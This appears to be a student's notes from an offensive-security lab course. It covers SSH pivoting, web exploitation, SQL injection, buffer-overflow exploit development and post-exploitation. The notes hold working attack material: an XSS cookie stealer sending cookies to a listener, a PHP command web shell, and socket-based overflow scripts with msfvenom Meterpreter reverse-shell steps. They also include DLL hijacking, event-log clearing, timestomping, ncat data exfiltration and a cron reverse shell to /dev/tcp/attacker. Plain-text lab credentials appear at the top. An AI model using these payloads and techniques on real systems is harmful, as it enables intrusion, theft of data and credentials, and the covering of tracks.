#### Login Info
Stack#: 10
Username: DAHA-019-M
Password: oybOV5rOD7Jo
Jump: 10.50.15.68
winops: 10.50.152.93
# Operations and Scanning
Open source intel:
social medial, linkdin, whois
### Active Enumerations
#### nmap scripts
    ls /usr/share/nmap/scripts
### Control Sockets
Authenticate to JUmp box, -S create socket file to store socket s, -M uses multiplexing, Kepp this open or the connection will die. up to 17 hops deep only unising a single connection
### Create master socket:
    ssh -MS /tmp/jump student@10.50.15.68 (own ip)
    ssh -MS /tmp/demo demo1@10.50.14.70 (demo ip)

## After moving to a new box do a ping sweep:
    for i in {97..126}; do (ping -c 1 192.168.28.$i | grep "bytes from"&); done

Scan for ports on listed on hosts
### set up dynamic tunnel:
        ssh -S /tmp/demo demo -O forward -D 9050
Proxychains nmap (taget ip) 
verify port
proxychains nc (targetip) (taget port)
### to close the dynamic tunnel
        ssh -S /tmp/demo demo -O cancel -D 9050
### Add listenting port forward
    ssh -S /tmp/demo demo -O forward -L1111:192.168.28.100:80 -L 1112:192.168.28.100:2222
### Remove port forward
    ssh -S /tmp/demo demo -O cancel -L1111:192.168.28.100:80 -L 1112:192.168.28.100:2222
#### verify port is open/banner grab
    ss -ntlp | grep (port number)
## Example on how to Master socket between mulitple hosts

        ssh -MS /tmp/jump jump student@ip
        ssh -S /tmp/jump jump -O  forward -D 9050
        ssh -S /tmp/jump jump -L 1111:1.2.3.4:80 -L 1112:1.2.3.4:22

        ssh -ms /tmp/t1 cred@127.0.0.1 -p 1112
        ssh -S /tmp/jump jump -O cancel -D 9050 >>> ssh -s /tmp/t1 t1 -O farward -D 9050
        ssh -s  /tmp/t1 t1 -O forward -L 2111:2.3.4.5:22 -L 2112:2.3.4.5:80

# Web Exploitation
## Enumeration of a web server
### /robots.txt 
    allows you to see all websites within webserver that can all be searched for info
    http://127.0.0.1/robots.txt
### http-enum.nse
    A scirpt that can be used with nmao to enum the website off a webserver
    nmap --script=http-enum.nse <ip>
## Methods of site traversal
### Inspect websever / Console
        changeText()

### Cross-site scripting (XSS)
        <img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">
        setup nc -l on machine
#### Coookie Stealer
        <script>document.location="http://<ip of nc listener:port>/Cookie_Stealer1.php?username=" + document.cookie;</script>
set up nc 
### stored javascript components 
        <script>alert('XSS');</script>
### ../
        
### malicous file upload
    <HTML><BODY>
    <FORM METHOD="GET" NAME="myform" ACTION="">
    <INPUT TYPE="text" NAME="cmd">
    <INPUT TYPE="submit" VALUE="Send">
    </FORM>
    <pre>
    <?php
    if($_GET['cmd']) {
    system($_GET['cmd']);
    }
    ?>
    </pre>
    </BODY></HTML>
### Command injection
use semicolons in test boxes on the webserver
##ssh key upload
### generate our key
    ssh-keygen -t rsa -b 4096
    No Passphrase
    cat /home/student/.ssh/id_rsa.pub

    #copy and paste the WHOLE key
### Prepare website > cmd injection > know users and home directories (/etc/passwd)
#### make /.ssh in the users home directory
    ;mkdir <Users Home Direcotry>/.ssh
    ;ls -la <Users Home Direcotry>

### upload key
    ;echo "ssh key" >> <User Home Directory>/.ssh/authorized_keys
    ;cat <User Home Direcotry>/.ssh/authorized_keys
### ssh into machine
        ssh -i /home/student/www/.ssh/id_rsa <username>@127.0.0.1 - p <port opened>
        
    
# SQL Injection
    SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
### To Test if Vulnerable
       ' OR 1='1 in User Name and psswd
       / are sign of input field sanitization aka no vulnerable
check network while inspecting element, request tab for the post request, take raw request, add a "?"then copy and paste the raw link into the url
### to enter sql server
    mysql
    show data; -show  database
    information_schema; -shows useful info
    use inforamtion_schema; enter database
    show tables ;
    show columns from columns;
## Golden Statement snf syntac
    UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
    <Name of Column>,<Name of Column>,<Name of Column>, FROM <NAME OF DATABASE>,<NAME OF TABLE>

## craft QUery
    SELECT <column,names> from database.columnname
    
## step 1 Identify Vulnerbale Field
    Selection=1 or 1=1
## step 2 Identify Number of Columns
match Number of options to the number columns
    Audi' UNION SELECT 1,2,3,4,5 #

## step 3 Edit Golden Statement
    Audi' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns
Added 2 and the 5 becuase the server side query did not display the second selection
## step 4 Craft Queries
    Audi' UNION SELECT tireid,name,size,cost,5 from session.Tires #
### Get REquest in the URL
in the URL AFter Selection=1 OR 1=1
cahnge selection number until info shows up

## Step one Identify vulnerable selection
    Selection=1 or 1=1
    selection=2 or 1=1
## Step Two Identify number of Columns
    Selection=2 UNION SELECT 1,2,3
## Step 3 Edit Golden Statement
    UNION SELECT table_schema,column_name,table_name from information_schema.columns
## Step 4 Caft a query

    Union SELECT name,type,cost from session.car 
    @@version to see version of sql 

    #TEST  OUT VULNERBALE FIELDS WITH ' to see if they auto close
    'Hacker', 'DIG', 'Hacker','password','password@username',1) #'


# REverse Engineering
## Dissasembly
Open Ghidra > file > New Project > Non-shared
File > import file > selct.exe > double click imported file 

Search > strings: > work from the end m seach for success

## patching
work backwards, look for success > 
right click > patch intructions
File > Export 

# Exploit Developement

-fno-stack-protector (vulbnerable to buffer overflow)
## try passing arguments
        ./func <<< $(echo "kladlkjasdkajsdlkasd")
        ./func $(echo "kladlkjasdkajsdlkasd")

## GDB
    gdb ./file
    info functions
    pdisass main
    look for get requests

## Steps
    #!/usr/bin/env python
    offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
    print (offset)
or
    find registry numer at EIP, input it on wiremask.eu
    
    run <<<$(python scwipt.py)

    show env
    unset env LINES
    unset enc COLUMNS
show env - gdb ./func > show en
or
    
    offset = "A" * 62
    eip = "\x59\x3b\xde\xf7" 
    nop = "\x90" * 15
    
    print(offset+eip)
## ON target System run <<< $(python scriptname.py)
find registry numer at EIP, input it on wiremask.eu
    info proc map
   run on target system: find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4 
## take first 4 addresses 
    0xf7de3b59 -> "\x59\x3b\xde\xf7"
    0xf7f588ab
    0xf7f645fb
    0xf7f6460f

# Remote Exploit


RUN FROM OPSTATION msfvenom -p linux/x86/exec CMD=<Command you want to run> -b '\x00' -f python
get output add to svupr

    ./func <<<$(python scwipt.py)

## Step 1 - Static Analysis
        strings.exe -a -nobanner .\vulserver.exe 
        strings.exe -a -nobanner .\vulnserver.exe | selesct -first 10
        strings.exe -a -n 7 -nobanner .\vulnserer.exe 

## Step2 - Behavior Analysis 
        Run exe as administrator
        get-process | findstr /i vuln
        netsetat -anop tcp | findstr <process id>

## Step 3 - Dynamic Anaylsis
Run Immunity as Administrator
        Open file > attach process
        commands: !mona modules
                  !mona jmp -r esp -m "essfunc.dll"







# Needed Scripts
        
    #!/usr/bin/python
    import socket
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #create the ipv4 socket, tcp protocol
    s.connect (("<Your Win OPs ip",9999)) #Connect to target IP and port 
    print s.recv(1024) #print response
    s.send(buf) #send the value of buf
    print s.recv(1024) #print response

        s.close() # Close the Socket

# Fuzzing
    #!/usr/bin/python
    import socket

    buf = "TRUN /.:/"
    ###FUZZING###
    buf += "A" * 5000
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #create the ipv4 socket, tcp protocol
    s.connect (("10.50.152.93",9999)) #Connect to target IP and port 
    print s.recv(1024) #print response
    s.send(buf) #send the value of buf
    print s.recv(1024) #print response

    s.close() # Close the Socket


# wiremask
    #!/usr/bin/python
    import socket

    buf = "TRUN /.:/"
    ###FUZZING###    
    #buf += "A" * 5000

    ###Wiremask##
    buf += "<wiremaskstring>"
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #create the ipv4 socket, tcp protocol
    s.connect (("10.50.152.93",9999)) #Connect to target IP and port 
    print s.recv(1024) #print response
    s.send(buf) #send the value of buf
    print s.recv(1024) #print response

    s.close() # Close the Socket
# WholeScript
    #!/usr/bin/python
    import socket

    #buf = "TRUN /.:/"
    ###FUZZING###
    #buf += "A" * 5000

    ###Wiremask##
    #buf += "<wiremaskstring>"
    ####OFFSET###
    #buf += "A" * 2003
    #buf += "BBBB"

    ### Find JMP ESP ###
    #use is imunity#
    # !mona modules   # look for unportected dlls
    # !mona jmp -r esp -m "essfunc.dll" windows > log data > take top 3 regisstry addresses
    #buf += " \xa0\x12\x50\x62"
    ### NOP SLED ###
    #buf += "\x90" * 15

    ###SHELL CODE ####
    ##msfvenom -p windows/meterpreter/reverse_tcp lhost=<target ip> lport=4444 -b "\x00\xfe\x20\x0a\xff" -f python
    ### msf CONSOLE ###
    '''
    msfconsole
    use multi//handler
    show options
    set payload windows/meterpreter/reverse_tcp
    set LHOST 0.0.0.0
    set LPORT 4444
    exploit

    '''
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #create the ipv4 socket, tcp protocol
    s.connect (("10.50.152.93",9999)) #Connect to target IP and port 
    print s.recv(1024) #print response
    s.send(buf) #send the value of buf
    print s.recv(1024) #print response

    s.close() # Close the Socket
        

# User Enumeration
WINDOWS: net user
Linux cat /etc/passwd
Windows: Tasklist /v
LInux: ps -elf

# Serivce ENumeration
WIndows tasklist /svc
linux chkconfig # sysv
systemctl --type=service systemD
# Network Enumation
windows: ipconfig /all
ifconfig -a 
ip a |
/etc/hosts

# Data Exfiltrations
session transicrt: ssh <user>@host | tee
Obfuscation (Windows)
type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out
certutil -encode <file> encoded.b64
Obfuscation (Linux)
cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
cat <file>> | base64
Encrypted Transport
**scp <source> <destination>
ncat --ssl <ip> <port> < <file>**

 
# Checking UAC Settings
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System

# Finding Vulnerable Scheduled tasks
schtasks /query /fo LIST /v
## for sysinternals suite
    net use Z: "\\https://live.sysinternals.com" /persistent:yes
    >mkdir "C:\Program Files (x86)\Putty"
    >>sc.exe create puttyService binPath="C:\Program Files (x86)\Putty\putty.exe" displayname="puttyservice" start=auto
    >>icacls "C:\Program Files (x86)\Putty" /grant BUILTIN\Users:W
    >>start
     ##run services
    >>##look for services in not in system 32, wrong spelling, no description. 

    get-psdrive
    ## go into share drive
    .\Procmon.exe
        ##    process Name contain "putty.exe"
        ##    Path contains ".dll"
        ##    Result is "NAME NOT FOUND"
        ###    this finds the dlls the process wants to use
        ###    look for dll that need to run in the same directory


# On linux
        msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll               
        scp student@<linopsip>:/home/student/Security/buff/SSPICLI.dll "C:\Program Files(x86)\Putty\" 
### restart the system and try to rename exe file. putty to ahhellnah
        msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\student\Desktop\whoami.txt' -f exe > putty.exe
        scp student@<linopsip>:/home/student/Security/buff/SSPICLI.dll "C:\Program Files(x86)\Putty\putty.exe"
        ##make sure windows defender is off


# log enumeration
    auditpol /get /category:*
    auditpol /get /category:* | findstr /i "success failure"
    Clear-Eventlog -Log Application, System
# Linux Privelege escalation
    sudo -l # show allowed sudo commands for user
    gtfobins.com # look up commands from sudo -l apt-get
    sudo apt-get update -o APT::Update::Pre-Invoke::=/b
## SUID/SGID    
        find / -type f -perm /4000 -ls 2>/dev/null # find SUID only files
        find / -type f -perm /2000 -ls 2>/dev/null # find SGID only files
        find / -type f -perm /6000 -ls 2>/dev/null # find SUID and SGID only files

        find command and use gtfobins
        use which to find command location
        /ussr/bin/nice /bin/sh -p 

        echo $PATH
        PATH=.:$PATH # adds . to PATH

        ls -latr /proc/1/exe
stat /sbin/init
man init
init --version
ps 1

ausearch -p 22
ausearch -m USER_LOGIN -sv no
ausearch -ua edwards -ts yesterday -te now -i

journalctl _TRANSPORT=audit
journalctl _TRANSPORT=audit | grep 603

auth.log/secure=Logins/authentications

lastlog=Each users' last successful login time

btmp=Bad login attempts

sulog=Usage of SU command

utmp=Currently logged in users (W command)

wtmp=Permanent record on user on/off

file /var/log/wtmp
find /var/log -type f -mmin -10 2> /dev/null
journalctl -f -u ssh
journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4
## TImestomp
    touch -c -t 201603051015 1.txt   # Explicit
    touch -r 3.txt 1.txt    # Reference

## Rsyslog
/etc/rsyslog
/etc/rsyslog.d/*
/etc/rsyslog.conf
# Creating a reverse shell 
crontab -e
*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/attacker/port 0>&1'





# Review from Dryrun
### scan ip address
    namp <ip>
    nc ip port
### navigate webserver
file to read = directory traversal technique ../../../../../ ex. /etc/passwd /etc/hosts -> view page source
upload files = upload shell
login screen = Authentication bypass ' or 1='1'
decode sting = cmd injection

### ping sweep ips 
     for i in {97..126}; do (ping -c 1 192.168.28.$i | grep "bytes from"&); done

### selections screen
OR 1=1 in URL
UNION Select 1,2,3..... until error
edit golden statement
union select column, column, column from database.table

## When on system
        find / -type f -perm /4000 -ls 2>/dev/null # find SUID only files
        find / -type f -perm /2000 -ls 2>/dev/null # find SGID only files
        find / -type f -perm /6000 -ls 2>/dev/null # find SUID and SGID only files

## If on windows machine
        look in folders, task schduler, look for task without descriptions 





# Methodology 
## Recon
Ping
Nmap/NC ports, make needed port forwards and navigate to the webserver. interact with the server as usua.
## web esploitation
test exploitation based on the contect of pages
examples: command injection ;whoami
         directory traversal ../../../../../etc/passwd
         auth bypass ' OR 1='1
## SQL INjecection
find the vulnerabkle field or1=1 in URL for get or '1 or 1-"1 for post
idenditfy number of coloumns union select1,2,3,
Goldern Statement
craft queries

## reverse engineering
static analysis - file, strings
Behavior analysis run the file fuzzing 
dynamic analysis -ghidra, search for stings for starting point
## exploit developement
Test how script takes input
./func <<<$(echo "string")
parameter ./func strings of chracter
GDB
write script in /tmp
Execute on target system (local buffer Overflow)
## Post exploitation 
host enumertation (passwd, hosts, home)
sudo -l list commands with sudo access, finds target and accounts the exploit
find -perm coommand
tasks scheduler services, crontab
registry keys, 
